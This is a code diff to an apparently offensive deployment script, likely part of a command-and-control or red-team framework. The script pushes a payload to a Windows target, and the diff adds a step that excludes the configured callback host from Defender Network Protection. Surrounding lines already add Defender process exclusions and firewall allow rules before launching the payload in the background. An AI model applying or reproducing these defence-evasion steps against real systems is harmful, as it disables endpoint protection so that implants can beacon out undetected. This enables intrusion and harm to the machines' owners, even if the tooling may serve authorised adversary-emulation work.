@@ -16,6 +16,7 @@ from lib.cli import CliConfig, agent_list, maybe_flush_payload_cache_for_rust_ag
 from lib.deploy import (
     TargetConfig,
     defender_add_process_exclusion,
+    defender_network_protection_exclusion,
     ensure_work_dir,
     execute_background,
     firewall_allow_program,
@@ -160,6 +161,16 @@ def deploy_and_checkin(
                 firewall_allow_program(target, remote_payload)
             except Exception as exc:
                 print(f"  [{tag}][deploy] firewall allow rule failed (non-fatal): {exc}")
+            try:
+                cb_host = (
+                    getattr(ctx, "env", {}).get("server", {}).get("callback_host")
+                    if ctx is not None else None
+                )
+                if cb_host:
+                    print(f"  [{tag}][deploy] Defender Network Protection IP exclusion ({cb_host})")
+                    defender_network_protection_exclusion(target, cb_host)
+            except Exception as exc:
+                print(f"  [{tag}][deploy] Network Protection exclusion failed (non-fatal): {exc}")
 
         # Step 4 — execute payload in background.
         print(f"  [{tag}][exec] launching payload in background on target")
